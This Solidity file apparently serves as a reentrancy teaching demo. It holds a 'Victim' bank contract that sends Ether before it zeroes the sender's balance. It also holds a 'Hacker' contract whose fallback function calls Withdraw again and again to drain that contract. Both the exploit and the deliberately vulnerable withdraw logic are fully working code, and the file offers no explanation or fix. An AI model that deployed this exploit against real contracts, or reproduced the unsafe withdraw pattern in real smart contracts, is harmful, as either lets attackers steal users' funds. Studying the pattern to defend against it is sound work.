// SPDX-License-Identifier: MIT

// VICTIM

pragma solidity ^0.8.7;

contract Victim{
    mapping(address => uint) public balanceof;   // 1st account address : 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4
                                               // 2nd account address : 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2
    function Deposit() public payable{
        balanceof[msg.sender] += msg.value;
    }

    function Withdraw() public{
        uint bal = balanceof[msg.sender];
        require(bal > 0);

        (bool success,)=msg.sender.call{value : bal}("");
        require(success, "not enough balance");

        balanceof[msg.sender] = 0;
    }

    function BalanceInContract() public view returns(uint){
        return address(this).balance;
    }
}


//HACKER

contract Hacker{

    Victim internal victim;

    constructor(address _victim){
        victim = Victim(_victim);
    }

    fallback()external payable {
        if(address(victim).balance >= 1 ether){
            victim.Withdraw();
        }
    }

    function attack() public payable{
        require(msg.value >= 1 ether , "Not enough Ether");
        victim.Deposit{value: 1 ether}();
        victim.Withdraw();
    }

    function BalanceInCorrect() public view returns(uint){
        return address(this).balance;
    }
}